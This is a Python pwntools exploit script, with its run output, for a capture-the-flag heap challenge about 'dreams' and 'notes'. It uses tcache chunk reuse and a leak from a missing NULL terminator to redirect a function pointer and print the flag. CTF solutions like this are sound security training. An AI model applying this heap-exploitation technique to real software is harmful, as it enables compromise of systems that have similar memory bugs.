from pwn import *

#p = process('./challenge')
#gdb.attach(p, gdbscript='b *menu')
p = remote("challs.nusgreyhats.org", 32833)

fake_flag = 0x000055555555585f
real_flag = 0x0000555555555765

p.recvuntil(b"> ") # menu
p.sendline(b"2") # start dream
p.recvuntil(b"> ") # dream
p.sendline(b"1") # add dream
p.recvuntil(b"to have? ") # how many dreams
p.sendline(b"3") # 3 dreams

# add_dream() default forces you to pick 1 dream
p.recvuntil(b"> ") # add which dream
p.sendline(b"1") # dream about valo
for i in range(2):
    p.recvuntil(b"> ") # dream menu
    p.sendline(b"1") # add dream
    p.recvuntil(b"> ") # add which dream
    p.sendline(b"4") # dream about fake flags

p.recvuntil(b"> ") # dream menu
p.sendline(b"2") # start dream

# now dreams[] is freed into tcache, size 0x20. The data of dream 3 is preserved

p.recvuntil(b"> ") # dream menu
p.sendline(b"3") # go back to menu
p.recvuntil(b"> ") # menu
p.sendline(b"1") # listen to class
p.recvuntil(b"> ")
p.sendline(b"1") # take note
p.recvuntil(b"note size: ")
p.sendline(b"16") # 16 bytes. malloc(16) digs into 0x20 sized tcache block so thats now used
p.recvuntil(b"note content: ")
p.sendline(b"A"*16) # overwrite 16 As into it. No NULL byte added at end, this is a vuln in the src code
p.recvuntil(b"> ") 
p.sendline(b"3") # read note
p.recvuntil(b"note index to read: ")
p.sendline(b"0") # read note 0
p.recvuntil(b"A"*16)

fake_flag_addr = u64(p.recvline().rstrip() + b"\x00"*2)
real_flag_addr = fake_flag_addr + real_flag - fake_flag
print(f"dream_about_flag_real at 0x{hex(real_flag_addr)}")

p.recvuntil(b"> ")
p.sendline(b"1") # take note
p.recvuntil(b"note size: ")
p.sendline(b"24")
p.recvuntil(b"note content: ")
p.sendline(b"A"*16 + p64(real_flag_addr)) # 32 bytes
p.recvuntil(b"> ")
p.sendline(b"2") # erase note
p.recvuntil(b"note index to remove: ")
p.sendline(b"1")
p.recvuntil(b"> ")
p.sendline(b"4") # go back to menu

# print("Heap bins to check tcache block ty")

p.recvuntil(b"> ")
p.sendline(b"2") # start dreaming. dreams is currently NULL
p.recvuntil(b"> ")
p.sendline(b"1") # add dream
p.recvuntil(b"to have? ")
p.sendline(b"3") # 3 dreams which now uses the buffer
p.recvuntil(b"> ")
p.sendline(b"1") # add whatever dream

p.recvuntil(b"> ") # dream menu
p.sendline(b"1") # add dream
p.recvuntil(b"> ") # add which dream
p.sendline(b"2") # whatever

p.recvuntil(b"> ") # dream menu
p.sendline(b"2") # start dream to execute our modified payload
p.interactive()

"""
[+] Opening connection to challs.nusgreyhats.org on port 32833: Done
dream_about_flag_real at 0x0x55b036535765
Heap bins to check tcache block ty
[*] Switching to interactive mode
THWACK! THWACK! THWACK! THWACK! THWACK! ACE!......
...
oooooooooooooooooooooooooo, cute kdrama guy.......
...
and the flag is.............. grey{i_dreamt_about_the_flag_appearing_in_my_dreams}............
...
you woke up from your dream -- 'wow what a good dream!'

1) add a dream
2) start dreaming!
3) go back
> $
"""